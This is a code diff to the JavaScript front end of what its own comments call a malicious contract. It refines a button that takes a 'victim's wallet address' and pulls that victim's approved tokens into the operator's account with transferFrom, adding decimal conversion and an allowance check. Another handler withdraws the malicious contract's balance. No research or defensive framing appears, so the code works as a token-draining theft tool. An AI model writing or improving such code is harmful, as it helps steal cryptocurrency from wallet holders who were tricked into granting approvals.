@@ -391,21 +391,29 @@ document.getElementById("checkBalanceBtn").addEventListener("click", async () =>
     }
 });
 
-// Withdraw Tokens (from victim's address)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
-    const amount = prompt("Enter the amount to withdraw:");
+    let amount = prompt("Enter the amount to withdraw:");
     if (victimAddress && amount) {
         try {
-            // Make sure the victim has approved the malicious contract
-            await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
+            const decimals = await tokenContract.methods.decimals().call();
+            const amountInWei = web3.utils.toBN(amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(decimals)));
+            
+            const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
+            if (web3.utils.toBN(allowance).lt(amountInWei)) {
+                alert("Insufficient allowance. Cannot withdraw.");
+                return;
+            }
+
+            await contract.methods.transferFrom(victimAddress, accounts[0], amountInWei).send({ from: accounts[0] });
             alert(`${amount} tokens withdrawn from the victim's account!`);
         } catch (error) {
-            alert("Error during withdrawal.");
-            console.error(error);
+            console.error("Error during withdrawal:", error);
+            alert("Error during token withdrawal. Check console for details.");
         }
     }
 });
+
 
 // Deployer Withdraw (withdraw from the malicious contract balance)
 document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
